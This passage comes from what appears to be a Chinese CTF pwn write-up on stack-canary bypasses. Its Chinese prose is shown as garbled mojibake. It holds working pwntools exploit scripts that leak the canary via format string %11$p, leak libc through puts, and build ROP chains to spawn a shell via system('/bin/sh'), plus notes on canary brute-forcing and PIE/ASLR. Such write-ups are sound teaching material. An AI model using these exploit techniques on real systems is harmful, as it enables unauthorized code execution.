comment\"># Ëé∑Âèñ canary</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>canary <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xa</span><span class=\"token comment\">#ÁªèËøáË∞ÉËØïÂèëÁé∞‰ΩéÂ≠óËäÇË¢´Ë¶ÜÁõñ‰∫Ü 0xaÔºåÊïÖÂáèÂéª 0xa Âç≥ÂèØ</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'Canary: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># Á¨¨‰∫åÊ¨°Ê∫¢Âá∫</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0xc</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>getshell<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ÊñπÊ≥ï‰∫å-Âà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûËé∑Âèñcanary\"><a class=\"markdownIt-Anchor\" href=\"#ÊñπÊ≥ï‰∫å-Âà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûËé∑Âèñcanary\">#</a> ÊñπÊ≥ï‰∫å Âà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûËé∑Âèñ Canary</h3>\n<h4 id=\"ÂéüÁêÜ-2\"><a class=\"markdownIt-Anchor\" href=\"#ÂéüÁêÜ-2\">#</a> ÂéüÁêÜ</h4>\n<p>Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÂèØ‰ª•ÊâìÂç∞Âá∫Ê†à‰∏≠ÁöÑÂÜÖÂÆπÔºåÂõ†Ê≠§Âà©Áî®Ê≠§ÊºèÊ¥ûÂèØ‰ª•ÊâìÂç∞Âá∫ canary ÁöÑÂÄºÔºå‰ªéËÄåËøõË°åÊ†àÊ∫¢Âá∫„ÄÇ</p>\n<h4 id=\"bjdctf_2020_babyrop2buuctfÂú®Á∫øËØÑÊµã-buuojcn\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_babyrop2buuctfÂú®Á∫øËØÑÊµã-buuojcn\">#</a> [bjdctf_2020_babyrop2](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2JqZGN0Zl8yMDIwX2JhYnlyb3Ay\">BUUCTF Âú®Á∫øËØÑÊµã (buuoj.cn)</span>)</h4>\n<p>‚Äã\t\tprintf Ê≥ÑÈú≤Âπ∂Âú®Ë¶ÜÁõñ canary</p>\n<h6 id=\"Ê£ÄÊü•Á®ãÂ∫è\"><a class=\"markdownIt-Anchor\" href=\"#Ê£ÄÊü•Á®ãÂ∫è\">#</a> Ê£ÄÊü•Á®ãÂ∫è</h6>\n<p><img data-src=\"/img/canary/canary1.png\" alt=\"image-20230608154555021\"></p>\n<p><img data-src=\"/img/canary/image-20230608154744048.png\" alt=\"image-20230608154744048\"></p>\n<h6 id=\"ida-2\"><a class=\"markdownIt-Anchor\" href=\"#ida-2\">#</a> IDA</h6>\n<ul>\n<li>gift ÂáΩÊï∞</li>\n</ul>\n<p><img data-src=\"/img/canary/image-20230608154908039.png\" alt=\"image-20230608154908039\"></p>\n<ul>\n<li>vlun ÂáΩÊï∞</li>\n</ul>\n<p><img data-src=\"/img/canary/image-20230608155218476.png\" alt=\"image-20230608155218476\"></p>\n<ol>\n<li>gitf ÂáΩÊï∞ÂæàÊòéÊòæÊúâÊ†ºÂºèËØùÂ≠ó‰∏≤Ê∫¢Âá∫ÔºåÂèØ‰ª•Âà©Áî®ÂéªÊ≥ÑÈú≤ canary„ÄÇ</li>\n<li>Â∞ÜÊ≥ÑÈú≤ÁöÑ canary ÂéªË¶ÜÂÜôÂú® buf ‰∏äÔºå‰ªéËÄåËææÂà∞ÁõÆÁöÑ</li>\n</ol>\n<p>ÈÇ£‰πàÁé∞Âú®ÔºåÊàë‰ª¨Âè™ÈúÄË¶Å‰∏Ä‰∏™ system (/bin/sh) Â∞±ÂèØ‰ª•ËææÂà∞ÁõÆÁöÑ‰∫Ü„ÄÇ</p>\n<p><img data-src=\"/img/canary/image-20230608155517052.png\" alt=\"image-20230608155517052\"></p>\n<p><img data-src=\"/img/canary/image-20230608155613180.png\" alt=\"image-20230608155613180\"></p>\n<p>ÂΩìÊàëÊ£ÄÊü•Â≠óÁ¨¶‰∏≤Êó∂ÔºåÂπ∂Ê≤°Êúâ /bin/sh Âíå system ÂáΩÊï∞ plt Ë°®È°πÔºåÊâÄ‰ª•ÈúÄË¶ÅÊàëÊ≥ÑÈú≤ libcÔºåÂéªÊûÑÂª∫ systemÔºà/bin/shÔºâ</p>\n<p>Â•ΩÔºåÊàë‰ª¨ÊâÄÊúâÁöÑÂ§ßËá¥ÊÄùË∑ØÊúâ‰∫ÜÔºåÊé•‰∏ãÊù•ÔºåÂ∞±ÊòØÁªÜËäÇ‰∏äÂäüÂ§´‰∫Ü„ÄÇ</p>\n<p>Ê≥ÑÈú≤ canary</p>\n<p>Êàë‰ª¨ÈúÄË¶ÅÈÄöËøá gdb Ë∞ÉËØïÔºàÈúÄË¶Å gdb ‰∏é pwndbg ËÅîÂêàË∞ÉËØïÔºåÂ¶ÇÊûú gdb Ê≤°Êúâ fmtarg ÂëΩ‰ª§ÁöÑÊàñÔºåÈúÄË¶ÅÈÄöËøá‰∏ãÈù¢ËøûÊé•ÂéªË∞ÉÊï¥„ÄÇ</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMi9hcnRpY2xlL2RldGFpbHMvMTA1NjQ4NzY5\">gdb+pwndbg ËÅîÂêàË∞ÉËØï</span></p>\n<p><img data-src=\"/img/canary/image-20230608160451473.png\" alt=\"image-20230608160451473\"></p>\n<p>ÂèØ‰ª•ÁúãÂà∞Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Ë∑ùÁ¶ª rbp Êúâ 5 ÁöÑÂÅèÁßªÔºåÂõ†‰∏∫Êó∂ 64 ‰ΩçÁ®ãÂ∫èÔºåÂâç 6 ‰∏™ÂèÇÊï∞ÈúÄË¶ÅÊîæÂà∞ÂØÑÂ≠òÂô®ÂÜÖÔºåÊâÄ‰ª•Ë∑ùÁ¶ª canary ÁöÑË∑ùÁ¶ªÂ∞±ÊúâÔºà5 + 6ÔºâÁöÑÂÅèÁßª„ÄÇ</p>\n<p>ÊâÄ‰ª•ÊûÑÈÄ†ÁöÑÁ¨¨‰∏Ä‰ªΩ payload1 ‰∏∫</p>\n<pre><code>%11$p\n</code></pre>\n<p>Êé•‰∏ãÊù•Â∞±ÊòØÔºåÊ≥ÑÈú≤ libc Âü∫ÂùÄÂíåÊûÑÈÄ† ROP Èìæ</p>\n<p>Ê≥ÑÈú≤ puts ÂáΩÊï∞Âú∞ÂùÄ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span>vuln_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Pull up your sword and tell me u story!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,b'\\0'))</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><!--ÊúÄÂêéÈúÄË¶ÅËøîÂõûÂà∞vulnÔºå‰∏çËÉΩÂú®ËøîÂõûmain„ÄÇ‰∏çÈúÄË¶ÅÂèçÂ§çÂéªÊâßË°åÁ®ãÂ∫è-->\n<p>ÊâßË°å systemÔºà/bin/shÔºâ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sys_addr <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload2 <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bin_sh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'gnome-terminal'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sh'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-c'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'bjd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># p = remote('node4.buuoj.cn',26896)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># p.recv()</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I'll give u some gift to help u!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># p.sendline(b'aaaaa')</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'%11$p'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># p.recvuntil(b'0x')\t</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'bjd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400993</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pop_rsi_r15 <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400991</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ret <span class=\"token operator\">=</span><span class=\"token number\">0x00000000004005f9</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># main_addr = 0x04008DA</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>vuln_addr <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span>vuln_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Pull up your sword and tell me u story!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,b'\\0'))</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sys_addr <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>payload2 <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bin_sh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ÊñπÊ≥ï‰∏â-ÈÄêÂ≠óËäÇÁàÜÁ†¥\"><a class=\"markdownIt-Anchor\" href=\"#ÊñπÊ≥ï‰∏â-ÈÄêÂ≠óËäÇÁàÜÁ†¥\">#</a> ÊñπÊ≥ï‰∏â  ÈÄêÂ≠óËäÇÁàÜÁ†¥</h3>\n<h5 id=\"ÂéüÁêÜ-3\"><a class=\"markdownIt-Anchor\" href=\"#ÂéüÁêÜ-3\">#</a> ÂéüÁêÜ</h5>\n<p>ÊØèÊ¨°ËøõÁ®ãÈáçÂêØÂêéÁöÑ Canary ÊòØ‰∏çÂêåÁöÑÔºå‰ΩÜÊòØÂêå‰∏Ä‰∏™ËøõÁ®ã‰∏≠ÁöÑ Canary ÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑ„ÄÇÂπ∂‰∏î ÈÄöËøá fork ÂáΩÊï∞ÂàõÂª∫ÁöÑÂ≠êËøõÁ®ãÁöÑ Canary ‰πüÊòØÁõ∏ÂêåÁöÑÔºåÂõ†‰∏∫ fork ÂáΩÊï∞‰ºöÁõ¥Êé•Êã∑Ë¥ùÁà∂ËøõÁ®ãÁöÑÂÜÖÂ≠ò„ÄÇ<br>\nÁàÜÁ†¥Ê¨°Êï∞ÔºöÂØπ‰∫é 32 ‰Ωç ELFÔºå‰ΩéÂ≠óËäÇÂõ∫ÂÆöÊòØ \\x00ÔºåÊâÄ‰ª•Âè™ÈúÄË¶ÅÂØπ‰∏â‰∏™Â≠óËäÇËøõË°åÁàÜÁ†¥„ÄÇÁàÜÁ†¥ÊñπÂºèÊòØÂÖàÂà©Áî®Ê†àÊ∫¢Âá∫Ë¶ÜÂÜôÊ¨°‰ΩéÂ≠óËäÇÔºåÂ¶ÇÊûúÂá∫ÈîôÁöÑËØùÔºå‰ºöÊä•ÈîôÔºåËé∑ÂæóÊ≠£Á°ÆÁöÑÊ¨°‰ΩéÂ≠óËäÇÁöÑËØùÔºå‰∏ç‰ºöÊä•Èîô„ÄÇËé∑ÂèñÊ≠£Á°ÆÁöÑÊ¨°‰ΩéÂ≠óËäÇ‰πãÂêéÔºåÂÜç‰æùÊ¨°ÁàÜÁ†¥Ê¨°È´òÂ≠óËäÇÂíåÈ´òÂ≠óËäÇ„ÄÇÊØè‰∏™Â≠óËäÇÁöÑÂèØËÉΩÊÄßÊòØ 256ÔºåÂõ†Ê≠§ 3 ‰∏™Â≠óËäÇÁöÑÈÄê‰∏™ÁàÜÁ†¥ÊÄªÊ¨°Êï∞ÊòØ 256+256+256=768 Ê¨°</p>\n<h5 id=\"ciscn-2023-ÂàùËµõfuncanary\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2023-ÂàùËµõfuncanary\">#</a> [[<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmZXIudmlwL3VzZXIvbG9naW4/cmVkaXJlY3Q9L3Byb2JsZW0vNDA1Nw==\">CISCN 2023 ÂàùËµõ] funcanary</span></h5>\n<p>ËøôÈ¢òÊó¢ÁÑ∂Êúâ pie ÁöÑËØùÔºåÈÇ£Â∞±ÂÖà‰ªãÁªç‰∏Ä‰∏ã pie Âêß„ÄÇ</p>\n<h6 id=\"linux-‰∏ãÁöÑpie‰∏éaslr\"><a class=\"markdownIt-Anchor\" href=\"#linux-‰∏ãÁöÑpie‰∏éaslr\">#</a> <strong>Linux ‰∏ãÁöÑ PIE ‰∏é ASLR</strong></h6>\n<p>Áî±‰∫éÂèóÂà∞Â†ÜÊ†àÂíå libc Âú∞ÂùÄÂèØÈ¢ÑÊµãÁöÑÂõ∞Êâ∞ÔºåASLR Ë¢´ËÆæËÆ°Âá∫Êù•Âπ∂ÂæóÂà∞ÂπøÊ≥õÂ∫îÁî®„ÄÇÂõ†‰∏∫ ASLR ÊäÄÊúØÁöÑÂá∫Áé∞ÔºåÊîªÂáªËÄÖÂú® ROP ÊàñËÄÖÂêëËøõÁ®ã‰∏≠ÂÜôÊï∞ÊçÆÊó∂‰∏çÂæó‰∏çÂÖàËøõË°å leakÔºåÊàñËÄÖÂπ≤ËÑÜÊîæÂºÉÂ†ÜÊ†àÔºåËΩ¨Âêë bss ÊàñËÄÖÂÖ∂‰ªñÂú∞ÂùÄÂõ∫ÂÆöÁöÑÂÜÖÂ≠òÂùó„ÄÇ</p>\n<p>ËÄå PIE (position-independent executable, Âú∞ÂùÄÊó†ÂÖ≥ÂèØÊâßË°åÊñá‰ª∂) ÊäÄÊúØÂ∞±ÊòØ‰∏Ä‰∏™ÈíàÂØπ‰ª£Á†ÅÊÆµ.text, Êï∞ÊçÆÊÆµ.*dataÔºå.bss Á≠âÂõ∫ÂÆöÂú∞ÂùÄÁöÑ‰∏Ä‰∏™Èò≤Êä§ÊäÄÊúØ„ÄÇÂêå ASLR ‰∏ÄÊ†∑ÔºåÂ∫îÁî®‰∫Ü PIE ÁöÑÁ®ãÂ∫è‰ºöÂú®ÊØèÊ¨°Âä†ËΩΩÊó∂ÈÉΩÂèòÊç¢Âä†ËΩΩÂü∫ÂùÄÔºå‰ªéËÄå‰Ωø‰Ωç‰∫éÁ®ãÂ∫èÊú¨Ë∫´ÁöÑ gadget ‰πüÂ§±Êïà„ÄÇ</p>\n<p>ASLR Âàô‰∏ªË¶ÅË¥üË¥£ÂÖ∂‰ªñÂÜÖÂ≠òÁöÑÂú∞ÂùÄÈöèÊú∫Âåñ„ÄÇ</p>\n<p><strong>PIE Â¶Ç‰Ωï‰ΩúÁî®‰∫é ELF ÂèØÊâßË°åÊñá‰ª∂</strong></p>\n<p>ELF Á®ãÂ∫èËøêË°åÁöÑÊó∂ÂÄôÊòØ cpu Âú®Á°¨Áõò‰∏äË∞ÉÂÖ•Âä†ËΩΩËøõÂÜÖÂ≠òÁöÑÔºåËøô‰∏™Êó∂ÂÄôÁ®ãÂ∫èÂ∞±Êúâ‰∫ÜÂÜÖÂ≠òÂú∞ÂùÄÁ©∫Èó¥„ÄÇ</p>\n<pre><code>ELF file format:\n+---------------+\n|  File header  | # Êñá‰ª∂Â§¥‰øùÂ≠òÊØè‰∏™ÊÆµÁ±ªÂûãÂíåÈïøÂ∫¶\n+---------------+ \n| .text section | # ‰ª£Á†ÅÊÆµ Â≠òÊîæ‰ª£Á†ÅÂíåÊåá‰ª§\n+---------------+\n| .data section | # Êï∞ÊçÆÊÆµ \n+---------------+\n| .bss section  | # bssÊÆµ Â≠òÊîæÊú™ÂàùÂßãÂåñÁöÑÂÖ®Â±ÄÂèòÈáèÂíåÈùôÊÄÅÂèòÈáè,‰∏ÄËà¨ÂèØËØªÂÜô\n+---------------+ # ÊòØÂ≠òÊîæshellcodeÁöÑÂ•ΩÂú∞Êñπ„ÄÇ\n|      ...      |\n+---------------+\n|  xxx section  |# 